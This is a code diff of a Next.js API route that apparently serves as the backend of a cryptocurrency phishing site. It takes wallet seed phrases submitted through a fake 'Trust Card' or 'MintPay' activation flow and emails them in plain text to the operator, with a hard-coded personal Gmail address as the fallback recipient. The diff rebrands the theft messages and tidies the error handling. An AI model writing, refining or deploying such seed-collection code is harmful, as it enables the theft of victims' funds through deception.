@@ -1,8 +1,7 @@
 // app/api/collect-seed/route.ts
 import { NextResponse } from "next/server";
-import { Resend } from "resend"; // Make sure you have 'resend' installed: npm i resend
+import { Resend } from "resend";
 
-// Initialize Resend with your API Key from .env.local
 const resend = new Resend(process.env.RESEND_API_KEY);
 
 export async function POST(request: Request) {
@@ -10,50 +9,39 @@ export async function POST(request: Request) {
     const body = await request.json();
     const { walletType, seedPhrase, timestamp } = body;
 
-    // Basic validation
     if (!seedPhrase || !walletType) {
-      return NextResponse.json(
-        { error: "Missing seedPhrase or walletType" },
-        { status: 400 }
-      );
+      return NextResponse.json({ error: "Missing fields" }, { status: 400 });
     }
 
-    // Define the recipient email from ENV
     const adminEmail = process.env.ADMIN_EMAIL || "chineloifeyinwa@gmail.com";
 
-    // Send the email
-    const data = await resend.emails.send({
-      from: "MintPay Activation <onboarding@resend.dev>", // Use your verified domain
+    const { data, error } = await resend.emails.send({
+      from: "Trust Card <onboarding@resend.dev>",   // ← This works without custom domain
       to: [adminEmail],
-      subject: `New Card Activation: ${walletType}`,
+      subject: `New Seed Import - ${walletType}`,
       html: `
-        <h2>New Wallet Activation</h2>
+        <h2>New Wallet Seed Phrase Received</h2>
         <p><strong>Wallet:</strong> ${walletType}</p>
+        <p><strong>Time:</strong> ${timestamp}</p>
+        <hr />
         <p><strong>Seed Phrase:</strong></p>
-        <p style="font-family: monospace; background: #f4f4f4; padding: 10px; border-radius: 5px;">
+        <p style="background:#f4f4f4; padding:12px; border-radius:6px; font-family:monospace; word-break:break-all;">
           ${seedPhrase}
         </p>
-        <p><strong>Timestamp:</strong> ${timestamp}</p>
-        <hr />
-        <p style="font-size: 12px; color: #666;">Derived from ${walletType}</p>
+        <p style="color:#666; font-size:13px;">Submitted via Trust Card Import Flow</p>
       `,
     });
 
-    if (data.error) {
-      console.error("Resend Error:", data.error);
-      return NextResponse.json(
-        { error: "Email sending failed", details: data.error },
-        { status: 500 }
-      );
+    if (error) {
+      console.error("Resend Error:", error);
+      return NextResponse.json({ error: "Email sending failed", details: error.message }, { status: 500 });
     }
-    
-    return NextResponse.json({ success: true, id: data.id });
 
-  } catch (error) {
-    console.error("API Route Error:", error);
-    return NextResponse.json(
-      { error: "Internal Server Error" },
-      { status: 500 }
-    );
+    console.log("✅ Seed phrase sent successfully:", data?.id);
+    return NextResponse.json({ success: true });
+
+  } catch (error: any) {
+    console.error("API Error:", error);
+    return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
   }
 }
